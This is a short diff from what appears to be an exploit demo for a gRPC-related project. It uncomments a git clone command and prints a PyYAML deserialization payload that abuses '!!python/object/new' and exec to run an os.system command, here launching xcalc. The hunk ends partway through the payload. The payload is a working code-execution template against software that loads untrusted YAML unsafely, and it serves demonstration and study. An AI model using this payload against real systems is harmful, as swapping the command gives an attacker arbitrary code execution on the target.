@@ -4,7 +4,7 @@ gRPC is a modern, open source, high-performance remote procedure call (RPC) fram
 * run the exploit file
 ```
 import os
-#os.system("git clone https://github.com/grpc/grpc.git")
+os.system("git clone https://github.com/grpc/grpc.git")
 payload = """!!python/object/new:type
   args: ["z", !!python/tuple [], {"extend": !!python/name:exec }]
   listitems: "__import__('os').system('xcalc')"
